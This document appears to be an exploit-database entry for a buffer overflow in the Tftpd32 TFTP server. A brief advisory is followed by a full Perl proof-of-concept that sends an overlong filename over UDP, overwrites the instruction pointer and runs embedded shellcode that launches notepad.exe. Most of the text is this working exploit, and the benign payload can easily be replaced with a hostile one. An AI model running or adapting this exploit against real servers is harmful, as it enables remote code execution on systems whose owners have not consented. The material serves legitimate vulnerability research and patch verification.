source: http://www.securityfocus.com/bid/6199/info

A buffer-overflow vulnerability has been reported for Tftpd32. The vulnerability is due to insufficient checks on user-supplied input. 

A remote attacker can exploit this vulnerability by supplying a long string as a name of the file to retrieve. This will trigger the buffer-overflow condition. Any malicious attacker-supplied code will be executed with the privileges of the Tftpd32 process.

#!/usr/bin/perl
#TFTP Server remote Buffer Overflow
use IO::Socket;
$host = "192.168.1.53";
$port = "69";
$data = "A";

#$buf .= "\x00\x02"; # Send ---- Choose one
$buf .= "\x00\x01"; # Recieve

$buf .= "A";
$num = "116";
$buf .= $data x $num;
$buf .= ".";
$num = "140"; # EIP section
$buf .= $data x $num;

$address = "\xFF\xFF\xFF\xFF";
$buf .= $address;

$egg = "\xEB\x27\x8B\x34\x24\x33\xC9\x33\xD2\xB2";
$egg .= "\x0B\x03\xF2\x88\x0E\x2B\xF2\xB8\xAF\xA7";
$egg .= "\xE6\x77\xB1\x05\xB2\x04\x2B\xE2\x89\x0C";
$egg .= "\x24\x2B\xE2\x89\x34\x24\xFF\xD0\x90\xEB";
$egg .= "\xFD\xE8\xD4\xFF\xFF\xFF";
$egg .= "notepad.exe";

$egg .= "\x90\x90\x90\x90\x90\x90";
$buf .= $egg;

$buf .= "\x00binary\x00";

$socket = IO::Socket::INET->new(Proto => "udp") or die "Socket error:
$@\n";
$ipaddr = inet_aton($host) || $host;
$portaddr = sockaddr_in($port, $ipaddr);
send($socket, $buf, 0, $portaddr) == length($buf) or die "Can't send:
$!\n";
print "Now, '$host' should open up a notepad\n";